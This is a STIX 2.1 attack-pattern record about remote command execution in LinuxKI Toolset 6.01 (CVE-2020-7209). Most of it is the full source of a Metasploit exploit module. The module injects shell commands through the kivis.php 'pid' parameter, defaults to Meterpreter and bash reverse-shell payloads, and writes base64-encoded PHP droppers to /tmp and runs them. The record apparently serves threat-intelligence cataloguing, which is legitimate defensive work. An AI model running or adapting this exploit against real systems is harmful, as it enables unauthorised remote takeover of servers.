{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6f440364-29e6-4f8b-ab6e-8c59d8f2b441",
    "created": "2024-08-14T17:01:29.052306Z",
    "modified": "2024-08-14T17:01:29.05231Z",
    "name": "LinuxKI Toolset 6.01 Remote Command Execution",
    "description": " This module exploits a vulnerability in LinuxKI Toolset <= 6.01 which allows remote code execution. The kivis.php pid parameter received from the user is sent to the shell_exec function, resulting in security vulnerability.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/linuxki_rce.rb",
            "external_id": "linuxki_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-7209"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/HewlettPackard/LinuxKI/commit/10bef483d92a85a13a59ca65a288818e92f80d78"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::PhpEXE\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::CmdStager\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'LinuxKI Toolset 6.01 Remote Command Execution',\n        'Description' => %q{\n          This module exploits a vulnerability in LinuxKI Toolset <= 6.01 which allows remote code execution.\n          The kivis.php pid parameter received from the user is sent to the shell_exec function, resulting in security vulnerability.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Cody Winkler', # discovery and poc\n          'numan t\u00fcrle' # msf exploit\n        ],\n        'References' => [\n          ['EDB', '48483'],\n          ['CVE', '2020-7209'],\n          ['PACKETSTORM', '157739'],\n          ['URL', 'https://github.com/HewlettPackard/LinuxKI/commit/10bef483d92a85a13a59ca65a288818e92f80d78']\n        ],\n        'Privileged' => false,\n        'Platform' => ['php', 'unix', 'linux'],\n        'Arch' => [ARCH_PHP, ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Targets' => [\n          [\n            'Automatic (PHP In-Memory)',\n            {\n              'Platform' => 'php',\n              'Arch' => ARCH_PHP,\n              'Type' => :php_memory,\n              'Payload' => { 'BadChars' => \"'\" },\n              'DefaultOptions' => { 'PAYLOAD' => 'php/meterpreter/reverse_tcp' }\n            }\n          ],\n          [\n            'Automatic (PHP Dropper)',\n            {\n              'Platform' => 'php',\n              'Arch' => ARCH_PHP,\n              'Type' => :php_dropper,\n              'DefaultOptions' => { 'PAYLOAD' => 'php/meterpreter/reverse_tcp' }\n            }\n          ],\n          [\n            'Automatic (Unix In-Memory)',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_memory,\n              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_bash' }\n            }\n          ],\n          [\n            'Automatic (Linux Dropper)',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :linux_dropper,\n              'DefaultOptions' => { 'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp' }\n            }\n          ]\n        ],\n        'DisclosureDate' => '2020-05-17',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'The path to the web application', '/']),\n    ])\n    register_advanced_options([\n      OptString.new('WritableDir', [true, 'Writable dir for droppers', '/tmp'])\n    ])\n  end\n\n  def check\n    findstr = rand_str\n    res = execute_command(\"echo '#{findstr}'\")\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}\") if (res.code == 404) || (res.code == 403)\n    if (res.code == 200) && res.body.include?(findstr)\n      return CheckCode::Vulnerable\n    end\n\n    CheckCode::Safe\n  rescue ::Rex::ConnectionError\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to the web service\")\n  end\n\n  def execute_command(cmd, _opts = {})\n    send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'linuxki/experimental/vis/', 'kivis.php'),\n      'vars_get' => {\n        'type' => 'kitrace',\n        'pid' => \"1;#{cmd};\"\n      }\n    })\n  rescue ::Rex::ConnectionError\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to the web service\")\n  end\n\n  def exploit\n    print_status(\"Executing #{target.name} target\")\n\n    print_status('Sending payload...')\n\n    case target['Type']\n    when :php_memory\n      execute_command(\"php -r '#{payload.encoded}'\")\n    when :unix_memory\n      execute_command(payload.encoded)\n    when :linux_dropper\n      execute_cmdstager(linemax: 1_500)\n    when :php_dropper\n      dropper\n    end\n  end\n\n  def dropper\n    php_file = \"#{rand_str}.php\"\n    tmp_file = Pathname.new(\n      \"#{datastore['WritableDir']}/#{php_file}\"\n    ).cleanpath\n\n    dropper = get_write_exec_payload(\n      writable_path: datastore['WritableDir'],\n      unlink_self: true # Worth a shot\n    )\n\n    dropper = Rex::Text.encode_base64(dropper)\n\n    register_file_for_cleanup(tmp_file)\n\n    execute_command(\"echo #{dropper} | base64 -d | tee #{tmp_file}\")\n    execute_command(\"php #{tmp_file}\")\n  end\n\n  def rand_str\n    Rex::Text.rand_text_alphanumeric(8..42)\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-05-17",
    "x_mitre_platforms": [
        "linux'"
    ]
}